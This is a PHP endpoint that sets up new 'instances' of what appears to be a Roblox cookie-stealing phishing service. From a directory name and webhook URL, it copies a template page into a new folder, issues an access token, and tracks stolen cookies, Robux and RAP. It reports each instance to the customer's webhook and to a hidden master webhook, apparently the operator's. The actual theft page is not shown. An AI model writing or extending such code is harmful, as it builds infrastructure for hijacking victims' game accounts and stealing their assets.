<?php
require_once __DIR__ . '/../config.php';
require_once __DIR__ . '/../functions.php';

header('Content-Type: application/json');

// Get POST data
$directory = trim($_POST['directory'] ?? '');
$webhook = trim($_POST['webhook'] ?? '');

// Validate
if (empty($directory) || empty($webhook)) {
    echo json_encode(['success' => false, 'error' => 'All fields are required']);
    exit;
}

// Sanitize directory
$directory = sanitizeDirectory($directory);

// Check if directory already exists
if (directoryExists($directory)) {
    echo json_encode(['success' => false, 'error' => 'Directory already exists']);
    exit;
}

// Validate webhook
if (!validateWebhook($webhook)) {
    echo json_encode(['success' => false, 'error' => 'Invalid webhook URL']);
    exit;
}

// Generate token
$token = generateToken();

// Create instance data
$instanceData = [
    'token' => $token,
    'directory' => $directory,
    'webhook' => $webhook,
    'createdAt' => date('Y-m-d H:i:s'),
    'stats' => [
        'totalVisits' => 0,
        'totalCookies' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0
    ]
];

// Save instance data
saveInstanceData($directory, $instanceData);

// Save token data
saveTokenData($token, $instanceData);

// Create instance folder and files
$instanceDir = __DIR__ . '/../' . $directory;
mkdir($instanceDir, 0755, true);

// Copy template files
copy(__DIR__ . '/../template/index.php', $instanceDir . '/index.php');

// Update instance config
$instanceConfig = "<?php\n";
$instanceConfig .= "define('INSTANCE_DIR', '$directory');\n";
$instanceConfig .= "define('INSTANCE_TOKEN', '$token');\n";
file_put_contents($instanceDir . '/config.php', $instanceConfig);

// Update global stats
updateGlobalStats('totalSites');

// Send success webhook
$webhookData = [
    'username' => BOT_NAME,
    'avatar_url' => BOT_AVATAR,
    'embeds' => [[
        'title' => '🎉 Instance Created!',
        'description' => "Your instance has been successfully created!",
        'color' => hexdec('00FF00'),
        'fields' => [
            ['name' => '🔗 Instance URL', 'value' => '```' . FULL_URL . '/' . $directory . '```', 'inline' => false],
            ['name' => '🎫 Access Token', 'value' => '```' . $token . '```', 'inline' => false],
            ['name' => '📊 Dashboard', 'value' => '[Click Here](' . FULL_URL . '/dashboard/sign-in.php?token=' . $token . ')', 'inline' => false]
        ],
        'timestamp' => date('c')
    ]]
];

// Send to user webhook
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Send to master webhook
if (defined('MASTER_WEBHOOK') && !empty(MASTER_WEBHOOK)) {
    $ch = curl_init(MASTER_WEBHOOK);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($webhookData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Return success
header('Location: ' . FULL_URL . '/dashboard/sign-in.php?token=' . $token);
exit;
